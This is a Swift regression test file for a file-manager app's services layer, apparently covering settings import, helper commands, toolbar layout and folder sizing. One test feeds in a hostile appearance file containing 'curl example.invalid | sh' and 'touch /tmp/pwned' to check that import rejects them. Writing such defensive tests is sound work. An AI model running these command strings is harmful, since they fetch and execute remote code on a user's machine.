import Foundation
import PorpoiseCore
import PorpoiseTestSupport
import Testing

@testable import PorpoiseServices

/// Regressions found by the second codebase sweep (Services).
@Suite(.isolatedSettings)
struct SweepTwoServicesTests {
    @Test func importedAppearanceCantChangeWhatTerminalsRun() throws {
        let s = Settings.shared
        var shared = AppearancePreferences()
        shared.themeName = "Nord"
        shared.shell = .custom
        shared.customShell = "/bin/sh"
        shared.shellArguments = ["-c", "curl example.invalid | sh"]
        shared.externalTerminal = .custom
        shared.externalCommand = "touch /tmp/pwned; true {dir}"
        try s.importAppearance(JSONEncoder().encode(shared))
        let now = s.appearancePreferences
        #expect(now.themeName == "Nord")
        let defaults = AppearancePreferences()
        #expect(now.shell == defaults.shell && now.customShell == defaults.customShell && now.shellArguments.isEmpty)
        #expect(now.externalTerminal == defaults.externalTerminal && now.externalCommand == defaults.externalCommand)
        // What it would run is listed, for the user to decide.
        #expect(
            try s.appearanceCommands(in: JSONEncoder().encode(shared)) == [
                "Shell: /bin/sh -c curl example.invalid | sh", "Terminal: touch /tmp/pwned; true {dir}",
            ])
        #expect(try s.appearanceCommands(in: JSONEncoder().encode(s.appearancePreferences)).isEmpty)
    }

    @Test func anUnreadablePresetDoesntLoseTheOthers() throws {
        let good = BatchRenamePreset(name: "Good", rules: [.changeCase(.lower)])
        let goodJSON = try JSONSerialization.jsonObject(with: JSONEncoder().encode(good))
        let future: [String: Any] = ["name": "Future", "rules": [["unknownRule": [:]]], "extensionMode": ["keep": [:]]]
        Settings.store.set(try JSONSerialization.data(withJSONObject: [goodJSON, future]), forKey: "batchRenamePresets")
        #expect(Settings.shared.batchRenamePresets == [good])
        Settings.shared.saveBatchRenamePreset(BatchRenamePreset(name: "New"))
        #expect(Settings.shared.batchRenamePresets.map(\.name) == ["Good", "New"])
    }

    /// What the app sends its helper passes the helper's own check of arguments.
    @Test func everythingTheAppSendsTheHelperIsAccepted() {
        let items = [URL(fileURLWithPath: "/Applications/Old App.app"), URL(fileURLWithPath: "/Library/Something/-rf")]
        for kind in [FileOperationKind.delete, .trash, .move, .copy, .link] {
            let plan = FileOperationsController.administratorCommands(kind, items, targets: [:], to: URL(fileURLWithPath: "/Users/Shared/dest"))
            for c in plan.commands { #expect(HelperRequests.refusal(c) == nil, "\(c)") }
        }
        let renames =
            FileOperationsController.renameCommands(URL(fileURLWithPath: "/Applications/a.app"), to: URL(fileURLWithPath: "/Applications/A.app"))
            + FileOperationsController.renameCommands(URL(fileURLWithPath: "/Applications/a.app"), to: URL(fileURLWithPath: "/Applications/b.app"))
        for c in renames { #expect(HelperRequests.refusal(c) == nil, "\(c)") }
    }

    @Test func anUnknownToolbarItemKeepsTheRestOfTheLayout() throws {
        Settings.store.set(try JSONEncoder().encode(["reload", "location", "bogus", "reload"]), forKey: "toolbarCommands")
        #expect(Settings.shared.toolbarCommands == [.reload, .location])
        Settings.store.set(try JSONEncoder().encode(["reload", "search"]), forKey: "toolbarCommands")
        #expect(Settings.shared.toolbarCommands == [.reload, .search, .location])
    }

    @Test func aSymlinkedFolderIsMeasuredAsTheFolder() throws {
        let s = try Scratch("sweep2size")
        try s.file("dir/file", "hello")
        try s.symlink("link", to: s.path("dir").path)
        #expect(FolderUsageCache().size(s.path("link"), depth: 10) == 5)
    }

    @Test func theSameFolderNamedTwiceIsScannedOnce() throws {
        let s = try Scratch("sweep2roots")
        try s.file("Root/a.txt", "a")
        try s.file("Root/sub/b.txt", "b")
        let upper = URL(fileURLWithPath: s.url.path + "/ROOT")
        // Only meaningful where names ignore case (the usual APFS).
        guard FileManager.default.fileExists(atPath: upper.path) else { return }
        let scan = PhysicalTreeScanner.scan([s.path("Root"), upper])
        #expect(UsageTree(scan).hardLinkAliases == 0)
        #expect(scan.entries.filter { !$0.directory }.count == 2)
    }
}
